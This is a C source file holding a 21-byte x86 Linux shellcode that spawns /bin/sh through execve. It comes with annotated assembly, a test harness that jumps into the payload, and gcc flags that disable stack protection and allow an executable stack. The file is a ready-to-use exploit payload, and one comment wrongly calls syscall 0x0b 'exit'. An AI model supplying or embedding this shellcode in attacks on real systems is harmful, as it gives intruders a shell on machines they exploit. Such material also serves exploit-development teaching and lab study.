/*
the shellcode for executing execve("/bin/sh",NULL,NULL) written by Ben Chang from WHU
size = 21 bytes
the syscall number of exit:0x0b
Tips:You can test the shellcode on your system(Linux) as follows:
$gcc -fno-stack-protector -z execstack shellcode_execve_21bytes.c -o shellcode_execve
$./shellcode_execve

int execve(const char * filename,char * const argv[ ],char * const envp[ ]);
arg1:the address of filename strings eg:/bin/sh
arg2:the address of arguments input to the binary to be executed,usually assign to "NULL"
arg3:the address of environment arguments,usually assign to "NULL"
arg1->ebx,arg2->ecx,arg3->edx 
syscall number:0x0b->eax(al)
*/
#include<stdio.h>
#include<string.h>
char shellcode[]=
	"\x31\xc9"              //xor ecx,ecx    #0->ecx
	"\xf7\xe1"              //mul ecx        #eax*ecx->64-bit 0->edx-eax
	"\xb0\x0b"              //mov al,0b      #0x0b->al
	"\x51"                  //push ecx       #push end char"\x00" for "/bin/sh"
	"\x68\x2f\x2f\x73\x68"  //push 68732f2f  #"//sh"
	"\x68\x2f\x62\x69\x6e"  //push 6e69622f  #"/bin"
	"\x89\xe3"              //mov ebx,esp    #the address of "/bin//sh"->ebx 
	"\xcd\x80";             //int 80         #invoke system call

int main()
{
    void (*testshellcode)() = (void*)&shellcode;
    printf("size of the shellcode:%dbytes\n",strlen(shellcode));
    testshellcode();
}